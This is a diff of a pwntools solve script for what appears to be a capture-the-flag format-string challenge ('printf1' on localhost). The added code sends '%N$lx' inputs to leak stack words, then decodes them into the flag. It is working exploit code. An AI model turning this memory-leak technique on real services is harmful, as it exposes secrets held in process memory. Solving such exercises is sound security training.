@@ -3,6 +3,7 @@
 # This exploit template was generated via:
 # $ pwn template --host localhost --port 4001 --libc ../../libc.so.6 ../src/printf1
 from pwn import *
+import binascii
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or '../src/printf1')
@@ -72,14 +73,17 @@ continue
 
 io = start()
 
-# shellcode = asm(shellcraft.sh())
-# payload = fit({
-#     32: 0xdeadbeef,
-#     'iaaa': [1, 2, 'Hello', 3]
-# }, length=128)
-# io.send(payload)
-# flag = io.recv(...)
-# log.success(flag)
+# leaking the flag
+flag_parts = []
+for i in range(6, 9):
+    io.recvuntil(b"something: ")
+    io.sendline(f"%{i}$lx".encode('ascii'))
+    io.recvuntil(b"You said: ")
+    data = io.recvuntil(b"\nDoesn't", drop=True).decode('ascii')
+    io.recvuntil(b"interesting.")
+    flag_parts.append(data)
 
-io.interactive()
+# reassemble the flag
+flag = "".join(map(lambda x: bytes.fromhex(x).decode('utf-8')[::-1], flag_parts))
+io.success(f"Flag is: {flag}.")
 
